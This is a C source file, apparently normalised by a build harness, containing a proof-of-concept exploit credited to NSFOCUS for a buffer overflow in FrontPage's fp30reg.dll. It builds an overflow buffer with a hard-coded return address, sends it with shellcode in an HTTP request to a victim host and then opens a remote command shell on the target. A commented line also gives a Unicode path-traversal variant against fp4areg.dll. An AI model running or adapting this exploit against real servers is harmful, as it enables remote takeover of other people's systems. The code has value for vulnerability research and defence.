#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  overbuff ;
typedef  int /*<<< orphan*/  buff ;

/* Variables and functions */
 int atoi (char*) ; 
 int /*<<< orphan*/  bzero (char*,int) ; 
 int /*<<< orphan*/  close (int) ; 
 int connect_to (char*,int) ; 
 int /*<<< orphan*/  exit (int) ; 
 scalar_t__ memcmp (char*,char*,int) ; 
 int /*<<< orphan*/  memcpy (char*,char*,int) ; 
 int /*<<< orphan*/  memset (char*,char,int) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 scalar_t__ read (int,char*,int) ; 
 int /*<<< orphan*/  runshell (int) ; 
 char* shellcode ; 
 int /*<<< orphan*/  sprintf (char*,char*,char*,char*,char*,int,char*) ; 
 int /*<<< orphan*/  strcat (char*,char*) ; 
 int /*<<< orphan*/  strcpy (char*,char*) ; 
 int strlen (char*) ; 
 int /*<<< orphan*/  strncat (char*,char*,int) ; 
 int /*<<< orphan*/  write (int,char*,int) ; 

main (int argc, char **argv)
{
  char overbuff[400];
  char buff[4096];

/* If system has the unicode bug, it is possible to attack fp4areg.dll */
/* char fppath[] = "/_vti_bin/..%c1%9cbin/fp4areg.dll"; */

  char fppath[] = "/_vti_bin/_vti_aut/fp30reg.dll";
  char server[] = "www.blahblah.com";
  char retaddress[] = "\x62\x18\xd5\x67";
  char jmpshell[] = "\xff\x66\x78";
  int  i, sockfd;
  int port = 80;

  if (argc < 2)
    {
      printf ("Proof of concept code for fp30reg.dll overflow bug by NSFOCUS Security Team\n\n");
      printf ("Usage: %s victim [port]\n", argv[0]);
      exit (-1);
    }

  if (argc > 2) port = atoi (argv[2]);

  sockfd = connect_to (argv[1], port);

  bzero (overbuff, sizeof (overbuff));
  bzero (buff, sizeof (buff));
  memset (overbuff, 'a', 258);
  memcpy (overbuff, jmpshell, strlen (jmpshell));
  strcpy (overbuff + 258, "%c");
  for (i = 0; i < 0x50; i += 4)
      strncat (overbuff, retaddress, 4);
  strcat (overbuff, "aaa");

  sprintf (buff,
           "GET %s?%s HTTP/1.1 \nHOST:%s\r\nContent-Type: \
text/html\nContent-Length:%d\r\nProxy_Connection: Keep-Alive\r\n\r\n%s",
           fppath, overbuff, server, strlen (shellcode), shellcode);
  printf ("buff len = %d\n", strlen (buff));

  write (sockfd, buff, strlen (buff));
  printf ("payload sent!\n");

  if(read (sockfd, buff, strlen(buff))<0)
  {
    printf("EOF\n");
    exit(-1);
  }
  else 
  {
    if(memcmp(buff,"XORDATA",8)==0)
    {
     printf("exploit succeed\n");
     /* Press Enter key to get the command prompt */
     runshell (sockfd);
    }
    else
    {
     printf("exploit failed\n");
     close(sockfd);
     exit(-1);
    }
  }

}